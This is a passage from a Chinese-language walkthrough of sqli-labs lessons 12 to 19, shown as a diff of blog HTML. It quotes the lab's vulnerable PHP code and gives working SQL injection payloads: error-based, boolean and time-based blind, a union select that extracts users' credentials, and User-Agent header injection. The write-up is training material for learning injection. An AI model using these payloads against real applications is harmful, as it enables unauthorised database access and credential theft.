+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">1&#34;</span><span class="p">)</span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">3</span><span class="p">)</span><span class="c1">-- -
+</span></span></span></code></pre></div><ol>
+<li>布尔注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) or left(database(),1)&gt;&#39;a&#39;-- -
+</span></span></span></code></pre></div><ol>
+<li>延时注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) or if(substr(database(),1,1)&gt;&#39;a&#39;,sleep(5), 1)-- -
+</span></span></span></code></pre></div><ol>
+<li>常规注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) union select 1, concat_ws(&#34;</span><span class="o">:</span><span class="s2">&#34;, username, password) from users-- -
+</span></span></span></code></pre></div><h4 id="lesson-13">lesson 13</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(&#39;</span><span class="si">$uname</span><span class="s2">&#39;) and password=(&#39;</span><span class="si">$passwd</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><p>同样也可以手工测试</p>
+<p><code>1'</code> 报错， <code>1&quot;</code> 不报错</p>
+<figure><img src="/ox-hugo/2022-04-21_22-01-09_screenshot.png" width="700px"/>
+</figure>
+
+<p>可以确定，与前面两题类似，只是用 <code>('')</code> 包裹，同时报错被注释了，不再赘述</p>
+<h4 id="lesson-14">lesson 14</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=</span><span class="si">$uname</span><span class="s2"> and password=</span><span class="si">$passwd</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><p>手工测试 <code>1&quot;</code> 报错
+确认由=&quot;&quot;= 包裹，不再赘述</p>
+<h4 id="lesson-15">lesson 15</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=&#39;</span><span class="si">$uname</span><span class="s2">&#39; and password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size=&#34;3&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;Try again looser&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//print_r(mysqli_error($con1));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/slap.jpg&#34;   /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>这里注释掉了error，因此只能依靠盲注</p>
+<p>首先想办法闭合</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or 1=1-- - #成功闭合
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#34; or 1=1-- - #闭合失败
+</span></span></span></code></pre></div><p>了解是 <code>''</code> 包裹，接下来开始盲注</p>
+<ol>
+<li>布尔盲注</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="s2">&#34;92&#34;</span><span class="c1">-- -
+</span></span></span></code></pre></div><p><del>2. 报错盲注（报错被禁用了）</del></p>
+<ol>
+<li>延时盲注</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;or if(left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;,sleep(5),1)-- -
+</span></span></span></code></pre></div><h4 id="lesson-16">lesson 16</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(</span><span class="si">$uname</span><span class="s2">) and password=(</span><span class="si">$passwd</span><span class="s2">) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size=&#34;3&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;Try again looser&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//print_r(mysqli_error($con1));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/slap.jpg&#34;  /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>先手工测试一下=1&rsquo;= <code>1&quot;</code> 均没有报错，结合源码得知报错被禁用
+尝试闭合</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or 1=1-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">-1&#34; or 1=1-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">--</span> <span class="o">-</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) or 1=1-- - #成功
+</span></span></span></code></pre></div><ol>
+<li>布尔盲注</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) or left(database(),1)&gt;&#39;a&#39;-- -
+</span></span></span><span class="line"><span class="cl"><span class="s2">-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="s2">&#34;92&#34;</span><span class="c1">-- -
+</span></span></span></code></pre></div><p><del>2. 报错盲注（报错被禁用了）</del></p>
+<ol>
+<li>延时盲注</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;)or if(left(database(),1)&gt;&#39;a&#39;,sleep(5),1)-- -
+</span></span></span></code></pre></div><h4 id="lesson-17">lesson 17</h4>
+<p>直接看源码，我们之前提到过，有对数据库操作的地方就有可能会发生注入，那在lesson 17当中，我们发现服务端进行了两次数据库操作，一次SELECT，一次UPDATE，那到底是不是两个都存在注入呢？</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//logging the connection parameters to a file for analysis.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fp</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;result.txt&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;User Name:&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;New Password:&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// connectivity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username= </span><span class="si">$uname</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//echo $row;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#39;&lt;font color= &#34;#0000ff&#34;&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$row1</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#39;Your Login name:&#39;. $row1;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$update</span><span class="o">=</span><span class="s2">&#34;UPDATE users SET password = &#39;</span><span class="si">$passwd</span><span class="s2">&#39; WHERE username=&#39;</span><span class="si">$row1</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$update</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo $update;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span></code></pre></div><p>很明显不是的，这里的 <code>$uname</code> 无法被很好地被我们利用，原因是服务端对 <code>$uname</code> 进行了过滤 <code>check_input()</code>:
+首先用 <code>substr()</code> 限制了变量的长度，让我们无法放置很长的查询语句
+PHP默认会所有的 <code>GET</code>, <code>POST</code>, <code>COOKIE</code> 数据自动执行 <code>addslashes()</code> 函数，旨在预定义字符添加反斜杠字符串：</p>
+<ul>
+<li>单引号（&rsquo;）</li>
+<li>双引号（&quot;）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<p>但是保险起见，我们使用 <code>get_magic_quotes_gpc()</code> 检测自动转义是否开启，因为如果已经转义过了，我们手动转义就会出现问题。
+接下来，为了存储得到实际的值，我们使用 <code>stripslashes()</code> 方法删除用于转义的反斜杠</p>
+<p>我们知道在数据库中，字符串需要用引号包裹，因此我们用 <code>ctype_digit()</code> 检测是否为纯数字，如果为字符串则增加引号。
+这里的 <code>mysqli_real_escape_string()</code> 方法再次转义所有特殊字符：
+\x00, \n, \r, \, &lsquo;, &quot; and \x1a.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// truncation (see comments)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$value</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">15</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Stripslashes if magic quotes enabled
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Quote if not a number
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">ctype_digit</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;&#39;&#34;</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// take the variables
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//making sure uname is not injectable
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span></code></pre></div><p>因此我们无法利用 <code>$uname</code> ，因为所有特殊字符都被转义导致无法逃逸，只能利用 <code>UPDATE</code> 语句中的 $passwd,用报错注入或者延时注入都可以实现，与 <code>SELECT</code> 一致</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="k">admin</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="mi">11</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- -&amp;submit=Submit
+</span></span></span></code></pre></div><h4 id="lesson-18">lesson 18</h4>
+<p>根据提示IP 地址有所限制，判断可能是对于HTTP header有所要求，查看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT  users.username, users.password FROM users WHERE users.username=</span><span class="si">$uname</span><span class="s2"> and users.password=</span><span class="si">$passwd</span><span class="s2"> ORDER BY users.id DESC LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result1</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$row1</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result1</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$row1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34; font size = 3 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$insert</span><span class="o">=</span><span class="s2">&#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;</span><span class="si">$uagent</span><span class="s2">&#39;, &#39;</span><span class="si">$IP</span><span class="s2">&#39;, </span><span class="si">$uname</span><span class="s2">)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$insert</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#39;Your IP ADDRESS is: &#39; .$IP;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;&lt;br&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size = 3 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Your User Agent is: &#39;</span> <span class="o">.</span><span class="nv">$uagent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/flag.jpg&#34;  /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span></code></pre></div><p>可以看到这里=$uname= <code>$passwd</code> 都进行了 <code>check_input()</code> 的过滤，因此只能另辟蹊径
+还有一条数据库操作语句是=INSERT= ，这里用到了 <code>$uagent</code>, <code>$IP</code> ，可以通过Burpsuite或者hackbar来修改header</p>
+<p>我们观察这条sql语句，我们能够修改的内容是$uagent的值，那么前后的两个=&rsquo;= 就需要闭合，然后利用报错注入，插入sql语句，然后使原sql语句报错，得到需要的结果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">user</span><span class="o">-</span><span class="n">agent</span><span class="o">=</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span></code></pre></div><h4 id="lesson-19">lesson 19</h4>
+<p>先读一下源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34; font size = 3 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$insert</span><span class="o">=</span><span class="s2">&#34;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#39;</span><span class="si">$uagent</span><span class="s2">&#39;, &#39;</span><span class="si">$IP</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
